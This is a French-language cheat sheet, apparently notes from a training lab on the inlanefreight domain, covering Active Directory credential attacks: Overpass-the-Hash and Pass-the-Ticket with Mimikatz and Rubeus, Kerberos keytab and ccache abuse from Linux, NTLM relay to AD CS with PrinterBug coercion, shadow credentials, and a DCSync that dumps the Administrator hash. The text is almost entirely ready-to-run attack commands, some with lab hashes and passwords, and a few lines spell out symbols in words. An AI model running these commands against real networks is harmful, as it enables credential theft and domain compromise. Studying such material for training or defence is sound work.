## OverPass the Hash avec Mimikatz  
```powershell   
mimikatz.exe privilege::debug  
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f  
```
*Forge un Ticket Granting Ticket à partir du hash NTLM et lance cmd.exe sous ce contexte*

## OverPass the Hash avec Rubeus  
```powershell 
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap  
```
*Demande un TGT en utilisant la clé AES256 et affiche le ticket en Base64*

## Importer un ticket directement avec Rubeus  
```powershell 
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt  
```
*Demande un TGT et l’injecte immédiatement dans la session Kerberos active*

## Convertir un fichier kirbi en Base64  
```powershell  
[Convert]::ToBase64String([IO.File]::ReadAllBytes(c :\tools\ticket.kirbi))  
```
*Convertit un ticket .kirbi en chaîne Base64 pour injection*

## Importer un ticket Base64 avec Rubeus  
```powershell   
Rubeus.exe ptt /ticket:Base64_TICKET  
```  
*Injecte un ticket encodé en Base64 dans la session Kerberos*

## Importer un fichier kirbi avec Mimikatz  
```powershell 
mimikatz.exe privilege::debug  
kerberos::ptt c :\path\to\ticket.kirbi  
exit  
```
*Charge un fichier .kirbi dans la session Kerberos active*

## PowerShell Remoting avec Mimikatz  
```powershell  
mimikatz.exe privilege::debug  
kerberos::ptt c :\path\to\ticket.kirbi  
exit  
powershell  
Enter-PSSession -ComputerName DC01  
```
*Utilise le ticket importé pour ouvrir une session PowerShell distante*

## PowerShell Remoting avec Rubeus  
```powershell  
Rubeus.exe createnetonly /program:c :\windows\system32\cmd.exe /show  
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt  
powershell  
Enter-PSSession -ComputerName DC01  
```
*Crée un processus netonly, injecte un TGT et se connecte en PowerShell Remoting* 

---

# Pass the Ticket (PtT) depuis Linux

## Vérifier intégration AD  
```bash
realm list  
ps -ef grep -i winbind  
ps -ef grep -i sssd  
```
*Vérifie si la machine est jointe au domaine et quels services d’intégration (sssd ou winbind) sont actifs*

## Rechercher les fichiers keytab  
```bash
find / -name *keytab* -ls 2>/dev/null  
``` 
*Liste tous les fichiers dont le nom contient keytab*  

## Vérifier les scripts cron pour keytab  
```bash  
crontab -l  
cat chemin/vers/script.sh  
```
*Identifie les scripts cron qui utilisent des keytab*  

## Lister un keytab  
```bash  
klist -k -t chemin/vers/fichier.keytab  
``` 
*Affiche les principaux et les KVNO présents dans un fichier keytab*  

## Importer un keytab et usurper un utilisateur  
```bash
kinit utilisateur@domaine -k -t chemin/vers/fichier.keytab  
klist  
```  
*Charge le ticket Kerberos depuis le keytab pour usurper l’utilisateur* 

## Accès SMB avec ticket Kerberos  
```bash    
smbclient //dc01/partage -k -c ls  
```
*Utilise le ticket Kerberos pour lister un partage SMB*  

## Extraire les hashs d’un keytab  
```bash    
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab  
```  
*Extrait les hashs NTLM et AES d’un fichier keytab*  

## Lister les ccache  
```bash  
ls -la /tmp  
``` 
*Affiche les fichiers de cache Kerberos dans /tmp*  

## Utiliser un ccache pour usurper un utilisateur  
```bash 
export KRB5CCNAME=/chemin/vers/krb5cc_user  
klist  
``` 
*Spécifie le fichier ccache à utiliser et affiche les tickets chargés*  

## Accès SMB avec ccache  
```bash
smbclient //dc01/C$ -k -c ls -no-pass  
```
*Liste un partage SMB en utilisant le cache Kerberos*  

## Impacket avec Kerberos  
```bash
proxychains impacket-wmiexec dc01 -k  
```
*Exécute un module Impacket en utilisant le ticket Kerberos via proxychains*  

## Evil-WinRM avec Kerberos  
```bash  
sudo apt-get install krb5-user -y  
modifier /etc/krb5.conf pour définir default_realm et kdc  
proxychains evil-winrm -i dc01 -r inlanefreight.htb  
```
*Installe le client Kerberos et lance Evil-WinRM en mode Kerberos*  

## Conversion ccache vers kirbi  
```bash 
impacket-ticketConverter krb5cc_XXXX julio.kirbi  
```
*Convertit un cache Kerberos en fichier kirbi* 

## Conversion kirbi vers ccache  
```bash 
impacket-ticketConverter julio.kirbi krb5cc_YYYY  
```
*Convertit un fichier kirbi en cache Kerberos* 

## Extraction credentials avec Linikatz  
```bash  
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh  
/opt/linikatz.sh  
```
*Extrait tickets et secrets Kerberos depuis plusieurs implémentations Linux* 

---

# Pass the Certificate (PtC)
## NTLM Relay sur AD CS
```powershell
impacket-ntlmrelayx -t http colon slash slash 10.129.234.110 slash certsrv slash certfnsh asp --adcs --smb2support --template KerberosAuthentication
```
*Relaye les authentifications NTLM vers le service web d’enrôlement AD CS pour récupérer un certificat machine*

### Forcer l’authentification d’une machine
```powershell
python3 printerbug.py INLANEFREIGHT.LOCAL slash wwhite deuxpoints package5shores_topher1 arrobase 10.129.234.109 10.10.16.12
```
*Exploite le spooler d’imprimante pour obliger DC01 à s’authentifier vers l’hôte attaquant*

### Certificat généré par le relay
le certificat est écrit dans DC01$.pfx

*Le certificat PKCS#12 de DC01 est stocké dans un fichier PFX pour l’authentification*

## Préparer les outils PKINIT

```powershell
git clone https colon slash slash github.com slash dirkjanm slash PKINITtools.git et cd PKINITtools
python3 -m venv dot venv
source dot venv slash bin slash activate
pip3 install -r requirements.txt
```
*Installe et active gettgtpkinit pour utiliser le certificat PFX*

### Corriger l’erreur libcrypto

```powershell
pip3 install -I git plushttps colon slash slash github.com slash wbond slash oscrypto.git
```
*Met à jour oscrypto pour résoudre le problème de détection de libcrypto*

## Obtenir un TGT via certificat

```powershell
python3 gettgtpkinit.py -cert-pfx slash chemin slash DC01$.pfx -dc-ip 10.129.234.109 inlanefreight.local slash dc01 arrobase slash tmp slash dc.ccache
```
*Demande un TGT PKINIT pour le compte machine DC01 et le stocke en ccache*

## DCSync avec ticket machine
```powershell
export KRB5CCNAME égal slash tmp slash dc.ccache
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator INLANEFREIGHT.LOCAL slash DC01 arrobase DC01.INLANEFREIGHT.LOCAL
```
*Utilise le ticket machine pour exécuter DRSUAPI et récupérer le hash NTLM de l’administrateur*

## Shadow Credentials addKeyCredentialLink
```powershell
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p package5shores_topher1 --target jpinkman --action add
```
*Ajoute une entrée PKINIT dans msDS KeyCredentialLink de l’utilisateur cible pour lui attacher un certificat*

## Obtenir un TGT via shadow cred
```powershell
python3 gettgtpkinit.py -cert-pfx slash chemin slash eFUVVTPf.pfx -pfx-pass bmRH4LK7UwPrAOfvIx6W -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL slash jpinkman slash tmp slash jpinkman.ccache
```
*Demande un TGT PKINIT pour jpinkman en utilisant le certificat shadow credential*

## Pass the Ticket shadow cred
```powershell
export KRB5CCNAME égal slash tmp slash jpinkman.ccache
klist
```
*Charge le ticket dans la session Kerberos active pour passer le ticket*

## WinRM Kerberos avec Evil WinRM
```powershell
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```
*Ouvre une session PowerShell distante via WinRM en Kerberos avec le ticket shadow credential*





